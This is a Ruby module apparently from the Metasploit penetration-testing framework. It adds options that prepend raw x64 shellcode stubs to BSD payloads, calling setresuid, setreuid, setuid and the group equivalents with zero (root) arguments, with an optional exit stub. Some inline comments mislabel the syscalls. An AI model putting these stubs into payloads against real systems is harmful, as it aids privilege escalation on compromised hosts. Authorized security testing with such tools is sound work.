# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/payload/bsd/x86'

###
#
# This class is here to implement advanced features for bsd-based
# payloads. BSD payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Bsd

  include Msf::Payload::Bsd::X86

  #
  # This mixin is chained within payloads that target the BSD platform.
  # It provides special prepends, to support things like chroot and setuid.
  #
  def initialize(info = {})
    ret = super(info)

    register_advanced_options(
      [
        Msf::OptBool.new('PrependSetresuid',
          [
            false,
            "Prepend a stub that executes the setresuid(0, 0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetreuid',
          [
            false,
            "Prepend a stub that executes the setreuid(0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetuid',
          [
            false,
            "Prepend a stub that executes the setuid(0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetresgid',
          [
            false,
            "Prepend a stub that executes the setresgid(0, 0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetregid',
          [
            false,
            "Prepend a stub that executes the setregid(0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetgid',
          [
            false,
            "Prepend a stub that executes the setgid(0) system call",
            false
          ]
        ),
        Msf::OptBool.new('AppendExit',
          [
            false,
            "Append a stub that executes the exit(0) system call",
            false
          ]
        ),
      ], Msf::Payload::Bsd)

    ret
  end

  def apply_prepends(buf)
    test_arch = [ *(self.arch) ]
    pre = ''
    app = ''

    if (test_arch.include?(ARCH_X86))
      handle_x86_bsd_opts(pre, app)
    elsif (test_arch.include?(ARCH_X64))
      handle_x64_bsd_opts(pre, app)
    end

    pre + buf + app
  end

  def handle_x64_bsd_opts(pre, app)
    if (datastore['PrependSetresuid'])
      # setresuid(0, 0, 0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x4d"     + # or rax, 77  (setgid=311>>2=77)
             "\x48\xc1\xe0\x02"     + # shl rax, 2
             "\x48\x83\xf0\x03"     + # xor rax, 3 (311&3=3)
             "\x48\x31\xff"         + # xor rdi, rdi 0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x48\x31\xd2"         + # xor rdx, rdx  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetreuid'])
      # setreuid(0, 0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x7e"     + # or rax, 126  (setreuid=126)
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetuid'])
      # setuid(0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x17"     + # or rax, 23  (setuid=23)
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetresgid'])
      # setresgid(0, 0, 0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x4e"     + # or rax, 78  (setgid=312>>2=78)
             "\x48\xc1\xe0\x02"     + # shl rax, 2 (78<<2=312)
             "\x48\x31\xff"         + # xor rdi, rdi 0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x48\x31\xd2"         + # xor rdx, rdx  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetregid'])
      # setregid(0, 0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x7f"     + # or rax, 127  (setuid=127)
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetgid'])
      # setgid(0)
      pre << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x5a"     + # or rax, 90  (setgid=181>>1=90)
             "\x48\xd1\xe0"         + # shl rax, 1
             "\x48\x83\xc8\x01"     + # or rax, 1 (setgid=181&1=1)
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['AppendExit'])
      # exit(0)
      app << "\x48\x31\xc0"         + # xor rax, rax
             "\x48\x83\xc8\x01"     + # or rax, 1  (exit=1)
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end
  end

end
